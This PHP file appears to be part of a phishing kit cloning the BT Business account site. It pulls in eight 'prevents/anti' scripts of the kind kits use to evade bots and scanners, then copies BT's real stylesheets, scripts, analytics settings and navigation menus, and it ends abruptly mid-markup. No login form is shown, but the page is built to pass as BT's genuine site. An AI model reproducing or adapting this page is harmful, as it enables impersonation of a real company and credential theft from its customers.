<?php
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta class="meta-viewport" name="viewport" content="width=device-width">
    <meta name="description" content="">
    <title>BT.com Business</title>
    
    <link href="https://secure.business.bt.com/Content/GroupsAndPermissions/assets/css/app.min.css?v=20211002.221709-bst" rel="stylesheet" />
    <link href="https://secure.business.bt.com/Content/GroupsAndPermissions/assets/css/app-blessed1.min.css?v=20211002.221709-bst" rel="stylesheet" />
    <link href="https://secure.business.bt.com/Content/GroupsAndPermissions/assets/css/_bt-icons.css?v=20211002.221709-bst" rel="stylesheet" />
    <link href="https://secure.business.bt.com/Content/GroupsAndPermissions/assets/css/_my-account.css?v=20211002.221709-bst" rel="stylesheet" />
    <link href="https://secure.business.bt.com/Content/Vendors/nprogress.css?v=20211002.221709-bst" rel="stylesheet" />
    <link href="https://secure.business.bt.com/Content/Common/assets/css/1FA.css" rel="stylesheet" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bluebird/3.3.5/bluebird.min.js"></script>
    <script type="text/javascript" src="https://secure.business.bt.com/Content/Hub/assets/js/modernizr.min.js"></script>
    <script type="text/javascript" src="https://secure.business.bt.com/Content/Hub/assets/cookie-toolbar/js/bt.cookies.api.js"></script>
    <script src="https://secure.business.bt.com/Bundles/Jquery?v=UlOwSjRbGt_S8edfPPpyDdd2Wc_rqZbo5zae7UJQCpI1"></script>

        <script src="https://assets.adobedtm.com/9a4a45c521ce/ca8c0388298c/launch-64697907a735.min.js"></script>
    <script type="text/javascript">
        $(document).ready(function () {
			CDEOmnitureConfig = {
				Environment: "btcom",
				Server: "BWP10427229",
				Channel: "BTB",
				Ya: "FYA",
				Reseller: "BT Retail",
				SID:  "lerkqld1q3qwemusoers5she",
				DSN: "BT.com",
				LoginStatus: "Logged out",
				ContactId: ""
			};
            s_doPlugins(s);
        });
    </script>
    
    
    
    

    <link href="https://secure.business.bt.com/Content/themes/base/JqueryUiStyles?v=OCFyForfHi0WqtXLXunMQvM_zdUfu-UtJrLpeNtgVks1" rel="stylesheet"/>

</head>
<body class="account-home-page">
    <a href="#body" class="hide">Skip to main page content</a>
    <!--[if lt IE 9]>
    <p class="browsehappy errorblock text--center">For a better experience, we recommend that you <a href="http://browsehappy.com/" target="_blank">upgrade your browser</a>.</p>
    <![endif]-->
     <section class="C001-masthead">
    <!-- wrapper for the component -->
    <div class="content-wrap flush--ends masthead">
        <div class="row  hide-for-small-only">
            <div class="columns small-12 hard flush">
                <ul class="btnav no-bullet bg--silver-gradient">
                    <li><a class="first-item" href="http://www.bt.com/">BT.com</a></li>
                    <li><a href="http://www.productsandservices.bt.com/consumerProducts/displayPnSHub.do?common_selectedPrimaryNavIndex=2">
                        At home</a></li>
                    <li class="selected"><a href="http://business.bt.com/">Business and Public Sector</a></li>
                    <li><a href="http://www.globalservices.bt.com/">Global business</a></li>
                    <li><a class="last-item" href="http://www.btplc.com/">BT Group</a></li>
                </ul>
            </div>
        </div>
        <div class="row ">
            <div class="columns small-12 bannersearch push--bottom">
                <a class="logo push-half--right" data-omtrack="Masthead:BTB Logo" title="Go to BT.com"
                    href="http://business.bt.com">
                    <img src="https://secure.business.bt.com/Content/Common/assets/Images/logo_81x38.gif" alt="BT Business" width="81px"
                        height="38px">
                </a>
                <img src="https://secure.business.bt.com/Content/Common/assets/Images/smb_heading-new.gif" alt="Business" width="69px"
                    height="39px">
                <div class="search hide-for-small-only">
                    <form role="search" method="post" action="//www.bt.com/searchresult?siteArea=btb.hub">
                    <label for="polaris-search">
                        Search</label>
                    <input type="text" placeholder="Search BT Business" id="polaris-search" name="queryText">
                    <button type="submit" class="polaris-linkasbutton polaris-primarylinkasbutton polaris-submit font--new-bt hide-for-small-only"
                        data-polaris-omtrack="Polaris:Mobile-view:Search">
                        <span>Search</span>
                    </button>
                    </form>
                </div>
                
            </div>
        </div>
        <div class="row ">
            <script type="text/javascript">
                /* Set all the dynamic links here */
                var baseUrl = '';
                var polarisNavLinks = {

                    loginWIdgetURL: baseUrl + '/CommonLogin.aspx',
                    trackOrderLoggedInLink: baseUrl + '/Account/LoginRedirect.aspx?tabId=3',
                    trackOrderNonLoggedInLink: baseUrl + '/Account/LoginRedirect.aspx?tabId=3',
                    faultManagementLoggedInLink: baseUrl + '/Account/LoginRedirect.aspx?tabId=4',
                    faultManagementNonLoggedInLink: baseUrl + '/Account/LoginRedirect.aspx?tabId=4',
                    emailLoggedInLink: baseUrl + '/Account/LoginRedirect.aspx?tabId=2',
                    emailNonLoggedInLink: baseUrl + '/Account/LoginRedirect.aspx?tabId=2',
                    tellUsPaidLoggedInLink: 'https://secure.business.bt.com/eserve/cust/loggedin/tellUsYouHavePaidLoggedIn.html?flag=showall',
                    tellUsPaidNonLoggedInLink: 'https://secure.business.bt.com/eserve/cust/loggedout/tellUsYouHavePaid.html'
                }
            </script>
            <!--[if lt IE 9]>
                <link rel="stylesheet" href="https://btbsecure.business.bt.com/CommonContent/css/lt-ie9.css" />
            <![endif]-->
            <!-- Get responsive HTML from Common content folder -->
<header aria-label="BT Header" class="bt-header">
    <div aria-labelledby="bt-top-nav" class="header-top-nav nav" role="navigation">
        <div class="header-top-nav-content bt-content">
            <a class="nav-link small" href="https://www.bt.com/">For the home</a> <a class="nav-link small selected" href="https://business.bt.com/">For business and public sector</a> <a class="nav-link small" href="https://www.globalservices.bt.com/en">For global business</a> <a class="nav-link small" href="https://www.bt.com/about/coronavirus">Coronavirus</a>
        </div>
    </div>
    <div class="header-main">
        <div class="header-main-container bt-content">
            <div class="header-logo">
                <a href="https://business.bt.com"><img alt="BT Business" class="logo" src="https://btbsecure.business.bt.com/commonContent/img/content/bt-logo.png"></a>
            </div>
            <div class="header-content">
                <div aria-labelledby="bt-global-nav-mobile" class="global-nav-mobile" role="navigation">
                    <div class="channel-selector-mobile" style="display: none;">
                        <div class="channel-selector">
                            <div class="channel-selector-text">
                                <p>Your business type:</p><span class="channel channel-selected-identifier">Channel Selector</span>
                            </div>
                            <div class="mobile-channels">
                                <a class="channel channel-identifier" data-schid="sme" href="/sme/">Small &amp; medium</a> <a class="channel channel-identifier" data-schid="corporate" href="/corporate/">Corporate</a> <a class="channel channel-identifier" data-schid="large-corporate" href="/large-corporate/">Large corporate</a> <a class="channel channel-identifier" data-schid="public-sector" href="/public-sector/">Public sector</a>
                            </div>
                        </div>
                    </div>
					<!--products and services section -->
                    <div class="accordion nav-accordion products sme">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title">
                                Products &amp; services
                            </div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link" href="https://business.bt.com/products/">
                            <div class="link">
                                Products &amp; services
                            </div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Broadband
                                    </div>
                                </div>
                                <div class="sub-categories">
                                   <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/" data-polaris-omtrack="Polaris:Nav:Broadband">Broadband</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/deals/" data-polaris-omtrack="Polaris:Nav:Broadband deals">Broadband deals</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/halo-for-business/" data-polaris-omtrack="Polaris:Nav:BT Halo for business">BT Halo for business</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/full-fibre/" data-polaris-omtrack="Polaris:Nav:Full Fibre">Full Fibre</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/broadband-only/" data-polaris-omtrack="Polaris:Nav:Broadband only">Broadband only</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/mobile-packages/" data-polaris-omtrack="Polaris:Nav:Broadband Deals with Mobile">Broadband Deals with Mobile</a><a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/guest-wifi/" data-polaris-omtrack="Polaris:Nav:Guest WiFi">Guest Wi-Fi</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/bt-leased-line/" data-polaris-omtrack="Polaris:Nav:BTnet leased line">BTnet leased line</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Mobile
                                  </div>
                                </div>
                                <div class="sub-categories">
                                <a class="sub-category" href="https://business.bt.com/products/mobile/">Mobile</a> <a class="sub-category" href="https://business.bt.com/products/mobile/phones/">Phones</a>  <a class="sub-category" href="https://business.bt.com/products/mobile/sim-only/">SIM-only</a> <a class="sub-category" href="https://business.bt.com/products/mobile/tablets/">Tablets</a> <a class="sub-category" href="https://business.bt.com/products/mobile/mobile-broadband/">Mobile broadband</a> <a class="sub-category" href="https://business.bt.com/products/mobile/upgrades/">Upgrade mobile</a> <a class="sub-category" href="https://business.bt.com/products/mobile/5plus-employees/">5+ employees</a></div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Voice
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/voice/">Voice</a> <a class="sub-category" href="https://business.bt.com/products/voice/phone-lines/">Phone lines & Featureline</a> <a class="sub-category" href="https://business.bt.com/products/voice/isdn/">ISDN</a> <a class="sub-category" href="https://business.bt.com/products/voice/conferencing/">Conferencing</a> <a class="sub-category" href="https://business.bt.com/products/voice/numbers/">Business numbers</a> <a class="sub-category" href="https://business.bt.com/products/voice/payphone-services/">Payphone services</a> <a class="sub-category" href="https://business.bt.com/products/voice/phone-lines/calling-features/">Call diversion</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Phone systems
                                    </div>
                                </div>
                                <div class="sub-categories">
                                <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/">Phone systems</a> <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/on-premises/">On-premises phone systems</a> <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/voip/">VoIP phone systems</a> <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/bt-cloudvoice-sip/">BT Cloud Voice SIP</a> <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/one-phone/">BT One Phone</a></div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Networking
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/networking/">Networking</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/bt-leased-line/" data-polaris-omtrack="Polaris:Nav:BTnet leased line">BTnet leased line</a> <a class="sub-category" href="https://business.bt.com/products/networking/ethernet-vpn/">Ethernet VPN</a> <a class="sub-category" href="https://business.bt.com/products/networking/ethernet-point-to-point/">Ethernet Point-to-Point</a> <a class="sub-category" href="https://business.bt.com/products/networking/ip-connect/">IP Connect</a> <a class="sub-category" href="https://business.bt.com/products/networking/managed-wan/">Managed WAN</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        IT
                                  </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/it-datacentre-services/">IT</a> <a class="sub-category" href="https://business.bt.com/insights/cyber-security-sme/">SME security solutions'</a><a class="sub-category" href="https://business.bt.com/products/it-datacentre-services/bring-your-own-device/">Bring Your Own Device</a> <a class="sub-category" href="https://business.bt.com/products/it-datacentre-services/data-centre-solutions/">Cloud &amp; Data Centre Solutions</a> <a class="sub-category" href="https://business.bt.com/products/computing-apps/domain-registration/">Domain registration</a> <a class="sub-category" href="https://business.bt.com/products/computing-apps/business-apps/">Business Apps</a> <a class="sub-category" href="https://business.bt.com/products/computing-apps/">Computing &amp; apps</a>  <!--test --> 
                                </div>
                            </div>
                            
                        </div>
                    </div>
                    <div class="accordion nav-accordion sme">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title">
                                Insights
                            </div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link" href="https://business.bt.com/insights/">
                            <div class="link">
                                Insights
                            </div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        The future of work
                                  </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights.html/?filters=%5Btopic%5DThe+future+is+now">The future is now</a> <a class="sub-category" href="https://business.bt.com/insights/digital-transformation/">Digital transformation</a> <a class="sub-category" href="https://business.bt.com/insights/remote-working/">Remote working</a> <a class="sub-category" href="https://business.bt.com/insights/digital-skills/">Digital skills</a> <a class="sub-category" href="https://business.bt.com/solutions/tech-start-up-bursary/">Small business support scheme</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Technology
                                  	</div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights/digital-transformation/ip-solutions/">IP technology</a> <a class="sub-category" href="https://business.bt.com/solutions/5g-bt-for-business/">5G</a> <a class="sub-category" href="https://business.bt.com/insights/cyber-security/cyber-security-solutions-and-services/">Cyber security</a> <a class="sub-category" href="https://business.bt.com/insights/5g/network-story/">Connectivity</a> 
                                </div>
                            </div>
								<div class="accordion-sub-nav">
									<div class="category">
										<div class="title">
                                        	Events
                                 	 	</div>
                                	</div>
                                	<div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights/events/">Events</a> 
									</div>
								</div>
<!-- 							<div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Public sector
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/solutions/public-sector/">Public sector</a>
                                </div>
                            </div> -->
                        </div>
                    </div>
                    <div class="accordion nav-accordion sme">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title">
                                Help
                            </div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link" href="https://btbusiness.custhelp.com/app/home/">
                            <div class="link">
                                Help
                            </div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Get help
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5055">Broadband &amp; internet</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5056">Phone line &amp; services</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5057">Office phones &amp; systems</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5059">Email, computing &amp; hosting</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5060">Mobile services</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5058">Billing</a>
                                                                    </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Get in touch
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/help/contact-us-business/#buy">Contact BT Business</a> <a class="sub-category" href="https://business.bt.com/moving-premises">Moving premises</a> <a class="sub-category" href="https://business.bt.com/help/contact-us-business/#closeaccount">Close an account</a>
                                    
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Tools
                                    </div>
                                </div>
                                <div class="sub-categories">
                                <a class="sub-category" href="https://business.bt.com/self-service/">Self-service with 'My account'</a> <a class="sub-category" href="https://secure.business.bt.com/Hub">My account</a> <a class="sub-category" href="https://secure.business.bt.com/Hub/?TYPE=33554433&amp;REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=senroGWh8TGVp8dKtT7ws0RFCMev5xVSoaPazTTmmXjVQBUO1b0FeZgu7vZkZTtD&amp;TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d1">Billing & payments</a> <a class="sub-category" href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html?ref=true">Pay bill</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=3">Report or track a fault</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=3">Track an order</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/service_status">Service status</a> <a class="sub-category" href="https://business.bt.com/comms/business-app/">Download the BT Business app</a></div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Useful links
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=6">Manage your services</a> <a class="sub-category" href="https://secure.business.bt.com/Hub/?TYPE=33554433&amp;REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=$SM$EZgATSXs8vWyol20%2b2QIjkOqMYn%2fZjUFYXW3AScMIR51DY8xcbHSEefKPxnW7oPV&amp;TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d2">Email</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=6">Manage your services</a> <a class="sub-category" href="https://btsportbusiness.com/">BT Sport for business</a> <a class="sub-category" href="https://business.bt.com/bt-local-business/">Find a local sales person</a> <a class="sub-category" href="https://business.forums.bt.com">Business forum</a> <a class="sub-category" href="https://www.bt.com/help/home/">BT for the home</a> <a class="sub-category" href="https://business.bt.com/help/how-are-we-doing/" data-polaris-omtrack="Polaris:Nav:Performance results ">Performance results</a> <a class="sub-category" href="https://www.bt.com/skillsfortomorrow/work-life" data-polaris-omtrack="Polaris:Nav:Free support for your business">Free support for your business</a>
					
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion nav-accordion products corporate">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title"></div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link">
                            <div class="link"></div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Broadband
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/" data-polaris-omtrack="Polaris:Nav:Broadband">Broadband</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/deals/" data-polaris-omtrack="Polaris:Nav:Broadband deals">Broadband deals</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/halo-for-business/" data-polaris-omtrack="Polaris:Nav:BT Halo for business">BT Halo for business</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/full-fibre/" data-polaris-omtrack="Polaris:Nav:Full Fibre">Full Fibre</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/broadband-only/" data-polaris-omtrack="Polaris:Nav:Broadband only">Broadband only</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/mobile-packages/" data-polaris-omtrack="Polaris:Nav:Broadband Deals with Mobile">Broadband Deals with Mobile</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/guest-wifi/" data-polaris-omtrack="Polaris:Nav:Guest WiFi">Guest Wi-Fi</a> <a class="sub-category" href="https://business.bt.com/products/broadband-and-internet/bt-leased-line/" data-polaris-omtrack="Polaris:Nav:BTnet leased line">BTnet leased line</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Mobile
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/mobile/">Mobile</a> <a class="sub-category" href="https://business.bt.com/products/mobile/phones/">Phones</a>  <a class="sub-category" href="https://business.bt.com/products/mobile/sim-only/">SIM-only</a> <a class="sub-category" href="https://business.bt.com/products/mobile/tablets/">Tablets</a> <a class="sub-category" href="https://business.bt.com/products/mobile/mobile-broadband/">Mobile broadband</a> <a class="sub-category" href="https://business.bt.com/products/mobile/upgrades/">Upgrade mobile</a> <a class="sub-category" href="https://business.bt.com/products/mobile/5plus-employees/">5+ employees</a>
                                </div>
                            </div>
<div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Voice
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/voice/">Voice</a> <a class="sub-category" href="https://business.bt.com/products/voice/phone-lines/">Phone lines & Featureline</a> <a class="sub-category" href="https://business.bt.com/products/voice/isdn/">ISDN</a> <a class="sub-category" href="https://business.bt.com/products/voice/conferencing/">Conferencing</a> <a class="sub-category" href="https://business.bt.com/products/voice/numbers/">Business numbers</a> <a class="sub-category" href="https://business.bt.com/products/voice/payphone-services/">Payphone services</a> <a class="sub-category" href="https://business.bt.com/products/voice/phone-lines/calling-features/">Call diversion</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Phone systems
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/">Phone systems</a> <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/on-premises/">On-premises phone systems</a> <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/voip/">VoIP phone systems</a> <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/bt-cloudvoice-sip/">BT Cloud Voice SIP</a> <a class="sub-category" href="https://business.bt.com/products/business-phone-systems/one-phone/">BT One Phone</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Networking
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/networking/">Networking</a> <a class="sub-category" href="https://business.bt.com/products/networking/ethernet-vpn/">Ethernet VPN</a> <a class="sub-category" href="https://business.bt.com/products/networking/ethernet-point-to-point/">Ethernet Point-to-Point</a> <a class="sub-category" href="https://business.bt.com/products/networking/ip-connect/">IP Connect</a> <a class="sub-category" href="https://business.bt.com/products/networking/managed-wan/">Managed WAN</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        IT
                                  </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/products/it-datacentre-services/">IT</a> <a class="sub-category" href="https://business.bt.com/insights/cyber-security-sme/">SME security solutions</a> <a class="sub-category" href="https://business.bt.com/products/it-datacentre-services/bring-your-own-device/">Bring Your Own Device</a> <a class="sub-category" href="https://business.bt.com/products/it-datacentre-services/data-centre-solutions/">Cloud &amp; Data Centre Solutions</a> <a class="sub-category" href="https://business.bt.com/products/computing-apps/domain-registration/">Domain registration</a> <a class="sub-category" href="https://business.bt.com/products/computing-apps/business-apps/">Business Apps</a> <a class="sub-category" href="https://business.bt.com/products/computing-apps/">Computing &amp; apps</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion nav-accordion corporate">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title">Insights</div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link" href="https://business.bt.com/insights/">
                            <div class="link">
                                Insights
                            </div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                    The future of work
									</div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights.html/?filters=%5Btopic%5DThe+future+is+now">The future is now</a> <a class="sub-category" href="https://business.bt.com/insights/digital-transformation/">Digital transformation</a> <a class="sub-category" href="https://business.bt.com/insights/remote-working/">Remote working</a> <a class="sub-category" href="https://business.bt.com/insights/digital-skills/">Digital skills</a> <a class="sub-category" href="https://business.bt.com/solutions/tech-start-up-bursary/">Small business support scheme</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Technology
                                  	</div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights/digital-transformation/ip-solutions/">IP technology</a> <a class="sub-category" href="https://business.bt.com/solutions/5g-bt-for-business/">5G</a> <a class="sub-category" href="https://business.bt.com/insights/cyber-security/cyber-security-solutions-and-services/">Cyber security</a> <a class="sub-category" href="https://business.bt.com/insights/5g/network-story/">Connectivity</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
									<div class="category">
										<div class="title">
                                        	Events
                                 	 	</div>
                                	</div>
                                	<div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/insights/events/">Events</a> 
                                	</div>
								</div>
                                <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Public sector solutions
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/solutions/public-sector/">Public sector solutions</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion nav-accordion corporate">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title"></div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link">
                            <div class="link"></div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Get help
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5055">Broadband &amp; internet</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5056">Phone line &amp; services</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5057">Office phones &amp; systems</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5059">Email, computing &amp; hosting</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5060">Mobile services</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/categories/detail/c/5058">Billing</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Get in touch
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://business.bt.com/help/contact-us-business/#buy">Contact BT Business</a> <a class="sub-category" href="https://business.bt.com/moving-premises">Moving premises</a> <a class="sub-category" href="https://business.bt.com/help/contact-us-business/#closeaccount">Close an account</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Tools
                                    </div>
                                </div>
                                <div class="sub-categories">
                                <a class="sub-category" href="https://business.bt.com/self-service/">Self-service with 'My account'</a> <a class="sub-category" href="https://secure.business.bt.com/Hub">My account</a> <a class="sub-category" href="https://secure.business.bt.com/Hub/?TYPE=33554433&amp;REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=senroGWh8TGVp8dKtT7ws0RFCMev5xVSoaPazTTmmXjVQBUO1b0FeZgu7vZkZTtD&amp;TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d1">Billing & payments</a> <a class="sub-category" href="https://secure.business.bt.com/eserve/cust/loggedout/payByCard.html?ref=true">Pay bill</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=3">Report or track a fault</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=3">Track an order</a> <a class="sub-category" href="https://btbusiness.custhelp.com/app/service_status">Service status</a> <a class="sub-category" href="https://business.bt.com/comms/business-app/">Download the BT Business app</a>
                                </div>
                            </div>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        Useful links
                                    </div>
                                </div>
                                <div class="sub-categories">
                                    <a class="sub-category" href="https://secure.business.bt.com/Hub/?TYPE=33554433&amp;REALMOID=06-74628036-ccc7-110a-b564-843bdb4e0cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=$SM$EZgATSXs8vWyol20%2b2QIjkOqMYn%2fZjUFYXW3AScMIR51DY8xcbHSEefKPxnW7oPV&amp;TARGET=$SM$HTTP%3a%2f%2fsecure%2ebusiness%2ebt%2ecom%2fAccount%2fLoginRedirect%2easpx%3ftabId%3d2">Email</a> <a class="sub-category" href="/Account/LoginRedirect.aspx?tabId=6">Manage your services</a> <a class="sub-category" href="https://btsportbusiness.com/">BT Sport for business</a> <a class="sub-category" href="https://business.bt.com/bt-local-business/">Find a local sales person</a> <a class="sub-category" href="https://business.forums.bt.com">Business forum</a> <a class="sub-category" href="https://www.bt.com/help/home/">BT for the home</a> <a class="sub-category" href="https://business.bt.com/help/how-are-we-doing/" data-polaris-omtrack="Polaris:Nav:Performance results ">Performance results</a> <a class="sub-category" href="https://www.bt.com/skillsfortomorrow/work-life" data-polaris-omtrack="Polaris:Nav:Free support for your business">Free support for your business</a>
					
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="accordion nav-accordion large-corporate">
                        <div class="accordion-title nav-accordion-title nav-link-mobile">
                            <div class="title">
                                Insights
                            </div>
                        </div>
                        <div class="accordion-content nav-accordion-content">
                            <a class="heading-link" href="https://business.bt.com/insights/">
                            <div class="link">
                                Insights
                            </div></a>
                            <div class="accordion-sub-nav">
                                <div class="category">
                                    <div class="title">
                                        The future of work
                                  </div>
                                </div>
                                <div class="sub-categories">
